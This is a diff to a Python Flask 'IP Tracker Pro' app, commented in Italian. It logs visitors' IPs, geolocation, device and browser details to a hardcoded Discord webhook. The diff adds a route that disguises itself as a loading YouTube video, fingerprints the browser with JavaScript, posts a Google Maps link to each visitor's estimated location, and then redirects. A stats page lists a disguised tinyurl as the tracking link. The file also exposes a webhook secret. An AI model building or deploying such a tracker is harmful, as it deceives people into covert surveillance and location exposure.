@@ -4,14 +4,16 @@ import requests
 import os
 import re
 import time
+import json
 
 app = Flask(__name__)
 
-# TUO WEBHOOK PERSONALE
+# CONFIGURAZIONE
 WEBHOOK_URL = "https://discord.com/api/webhooks/1528013241819594853/ajTR7-zJ32yBsxulXb4688xXeWaqVgr9pQk6dW3ffPpFaeWgbWydLkRQyH6M56515lNA"
-
-# Immagine da mostrare
 IMAGE_URL = "https://media.discordapp.net/attachments/1527831756005183559/1528024870393483475/Nuovo_progetto_-_2026-07-18T150514.387.png?ex=6a5ccb8e&is=6a5b7a0e&hm=709fc7a05f8b331d71610beac5dd3757722bb147a2b4a6f7f36d8b2060094563&=&format=webp&quality=lossless&width=17&height=17"
+
+# Contatore visite
+visit_counter = 0
 
 def get_ip_info(ip):
     """Ottiene info geolocalizzazione complete"""
@@ -61,12 +63,10 @@ def get_device_info(request):
         "is_bot": False
     }
     
-    # Detect Bot
     bots = ['bot', 'crawler', 'spider', 'scraper', 'curl', 'wget', 'python', 'java']
     if any(bot in ua.lower() for bot in bots):
         info["is_bot"] = True
     
-    # Detect OS
     if 'Windows NT 10' in ua:
         info["os"] = "Windows 10/11"
     elif 'Windows NT 6.3' in ua:
@@ -96,7 +96,6 @@ def get_device_info(request):
         info["is_tablet"] = True
         info["device"] = "Tablet"
     
-    # Detect Browser
     if 'Edg/' in ua:
         info["browser"] = "Edge"
         version = re.search(r'Edg/(\d+)', ua)
@@ -129,35 +128,34 @@ def get_all_ips(request):
         "remote_addr": request.remote_addr
     }
     
-    # X-Forwarded-For (contiene tutti gli IP della catena)
     forwarded = request.headers.get('X-Forwarded-For', '')
     if forwarded:
         ips["x_forwarded_for"] = forwarded
-        # Il primo IP è il client reale, l'ultimo è il proxy più vicino
         ip_list = [ip.strip() for ip in forwarded.split(',')]
         if ip_list:
-            ips["ip_pubblico_rete"] = ip_list[0]  # IP pubblico del router
+            ips["ip_pubblico_rete"] = ip_list[0]
             if len(ip_list) > 1:
-                ips["ip_proxy"] = ip_list[-1]  # Ultimo proxy
+                ips["ip_proxy"] = ip_list[-1]
     
-    # X-Real-IP
     real_ip = request.headers.get('X-Real-IP', '')
     if real_ip:
         ips["x_real_ip"] = real_ip
     
-    # IP locale (dal remote_addr se è privato)
     remote = request.remote_addr
     if remote.startswith(('192.168.', '10.', '172.', '127.')):
         ips["ip_privato_locale"] = remote
     
     return ips
 
-def send_to_discord(ip_data, ip_info, device_info, request_info, route_name):
+def send_to_discord(ip_data, ip_info, device_info, request_info, route_name, extra_info=None):
     """Invia TUTTO in un unico embed compatto"""
+    global visit_counter
+    visit_counter += 1
     date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")
     
     # Costruisci la descrizione con TUTTE le info
     description = f"**📅 Data e Ora:** `{date}`\n"
+    description += f"**🔢 Visita #:** `{visit_counter}`\n"
     description += f"**🛤️ Route:** `{route_name}`\n\n"
     
     # IP Info
@@ -183,7 +181,6 @@ def send_to_discord(ip_data, ip_info, device_info, request_info, route_name):
         description += f"**🔢 AS:** {ip_info.get('as', 'N/D')} ({ip_info.get('asname', 'N/D')})\n"
         description += f"**🔄 Reverse DNS:** {ip_info.get('reverse', 'N/D')}\n"
         
-        # Flags
         flags = []
         if ip_info.get('mobile'): flags.append("📱 Mobile")
         if ip_info.get('proxy'): flags.append("🔒 Proxy/VPN")
@@ -209,15 +206,30 @@ def send_to_discord(ip_data, ip_info, device_info, request_info, route_name):
     description += f"**🚫 DNT:** {request_info.get('dnt', 'N/D')}\n"
     description += f"**🍪 Cookies:** {request_info.get('cookies', 0)}\n"
     
+    # 🆕 EXTRA INFO (fingerprinting JS)
+    if extra_info:
+        description += "\n**══════ 🔬 DETTAGLI TECNICI ══════**\n"
+        if extra_info.get('screen'): description += f"**📺 Risoluzione:** {extra_info['screen']}\n"
+        if extra_info.get('colorDepth'): description += f"**🎨 Colori:** {extra_info['colorDepth']}\n"
+        if extra_info.get('platform'): description += f"**💿 Piattaforma:** {extra_info['platform']}\n"
+        if extra_info.get('cores'): description += f"**⚙️ CPU Core:** {extra_info['cores']}\n"
+        if extra_info.get('memory'): description += f"**💾 RAM:** {extra_info['memory']} GB\n"
+        if extra_info.get('connection'): description += f"**📶 Rete:** {extra_info['connection']}\n"
+        if extra_info.get('touch'): description += f"**👆 Touch:** {extra_info['touch']}\n"
+    
+    # Mappa Google Maps
+    if ip_info and ip_info.get('lat') != 'N/D' and ip_info.get('lon') != 'N/D':
+        description += f"\n**🗺️ Mappa:** [Clicca qui](https://www.google.com/maps?q={ip_info['lat']},{ip_info['lon']})\n"
+    
     data = {
-        "content": f"🔔 **Nuovo Accesso!** | `{ip_data['ip_pubblico_rete']}` | {ip_info.get('country', '?') if ip_info else '?'}",
+        "content": f"🔔 **#{visit_counter}** | `{ip_data['ip_pubblico_rete']}` | {ip_info.get('country', '?') if ip_info else '?'} | {device_info.get('os', '?')}",
         "embeds": [{
             "title": "🎯 REPORT COMPLETO",
             "description": description,
             "color": 5814783,
             "timestamp": date,
             "footer": {
-                "text": "IP Tracker Pro"
+                "text": f"IP Tracker Pro • Visita #{visit_counter}"
             }
         }]
     }
@@ -225,7 +237,7 @@ def send_to_discord(ip_data, ip_info, device_info, request_info, route_name):
     try:
         response = requests.post(WEBHOOK_URL, json=data)
         if response.status_code == 204:
-            print(f"✅ Inviato")
+            print(f"✅ Inviato #{visit_counter}")
         elif response.status_code == 429:
             time.sleep(2)
             response = requests.post(WEBHOOK_URL, json=data)
@@ -233,6 +245,8 @@ def send_to_discord(ip_data, ip_info, device_info, request_info, route_name):
             print(f"❌ Errore: {response.status_code}")
     except Exception as e:
         print(f"❌ Eccezione: {e}")
+
+# ============ ROUTES ORIGINALI (INTATTE) ============
 
 @app.route("/")
 def index():
@@ -303,6 +317,102 @@ def video_preview():
                     "dnt": request.headers.get('DNT', 'N/D'), "cookies": len(request.cookies)}
     send_to_discord(ip_data, ip_info, device_info, request_info, "Video")
     return redirect("https://www.youtube.com/shorts/8W7RA8Akfxo?feature=share")
+
+# 🆕 NUOVA ROUTE: Tracciamento avanzato con fingerprinting JS
+@app.route("/advanced")
+@app.route("/pro")
+@app.route("/full")
+def advanced_tracker():
+    """Tracciamento con info aggiuntive dal browser"""
+    ip_data = get_all_ips(request)
+    ip_info = get_ip_info(ip_data["ip_pubblico_rete"])
+    device_info = get_device_info(request)
+    request_info = {"method": request.method, "referrer": request.headers.get('Referer', 'N/D'), 
+                    "accept_language": request.headers.get('Accept-Language', 'N/D'),
+                    "dnt": request.headers.get('DNT', 'N/D'), "cookies": len(request.cookies)}
+    send_to_discord(ip_data, ip_info, device_info, request_info, "Advanced")
+    
+    return f"""
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="UTF-8">
+        <meta property="og:title" content="Caricamento video...">
+        <meta property="og:description" content="Il video si sta aprendo">
+        <meta property="og:image" content="https://i.ytimg.com/vi/8W7RA8Akfxo/maxresdefault.jpg">
+        <style>
+            *{{margin:0;padding:0}}body{{background:#0f0f0f;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial}}
+            .spinner{{width:50px;height:50px;border:4px solid #303030;border-top:4px solid red;border-radius:50%;animation:spin 1s linear infinite}}
+            @keyframes spin{{0%{{transform:rotate(0deg)}}100%{{transform:rotate(360deg)}}}}
+            p{{color:#aaa;margin-top:20px;font-size:14px}}
+        </style>
+    </head>
+    <body>
+        <div style="text-align:center">
+            <div class="spinner"></div>
+            <p>Caricamento video...</p>
+        </div>
+        <script>
+            // Raccoglie fingerprint del browser
+            const extra = {{
+                screen: screen.width + 'x' + screen.height,
+                colorDepth: screen.colorDepth + ' bit',
+                platform: navigator.platform,
+                cores: navigator.hardwareConcurrency || 'Sconosciuto',
+                memory: navigator.deviceMemory || 'Sconosciuto',
+                connection: navigator.connection ? navigator.connection.effectiveType : 'Sconosciuto',
+                touch: ('ontouchstart' in window) ? 'Si' : 'No'
+            }};
+            
+            // Invia dati al server
+            fetch('/collect', {{
+                method: 'POST',
+                body: JSON.stringify(extra),
+                headers: {{'Content-Type': 'application/json'}}
+            }}).catch(() => {{}});
+            
+            // Redirect dopo 1.5 secondi
+            setTimeout(function() {{
+                window.location.href = "https://www.youtube.com/shorts/8W7RA8Akfxo?feature=share";
+            }}, 1500);
+        </script>
+    </body>
+    </html>
+    """
+
+# 🆕 Endpoint per ricevere dati extra dal client
+@app.route("/collect", methods=["POST"])
+def collect_extra():
+    """Riceve dati fingerprint dal browser"""
+    try:
+        extra_data = request.get_json()
+        if extra_data:
+            print(f"📊 Extra: {extra_data}")
+            # Salva su file per statistiche
+            try:
+                with open('/tmp/extra_data.json', 'a') as f:
+                    f.write(json.dumps(extra_data) + '\n')
+            except:
+                pass
+    except:
+        pass
+    return "ok", 200
+
+# 🆕 Route per vedere statistiche
+@app.route("/stats")
+def stats():
+    return f"""
+    <html>
+    <head><title>Stats</title>
+    <style>body{{background:#1a1a1a;color:#fff;font-family:Arial;padding:20px}}h1{{color:red}}</style>
+    </head>
+    <body>
+        <h1>📊 Statistiche</h1>
+        <p>🔢 Visite totali: <strong>{visit_counter}</strong></p>
+        <p>🔗 Link tracciante: <code>https://tinyurl.com/youtube-shorts-8W7RA8Akfxo</code></p>
+    </body>
+    </html>
+    """
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
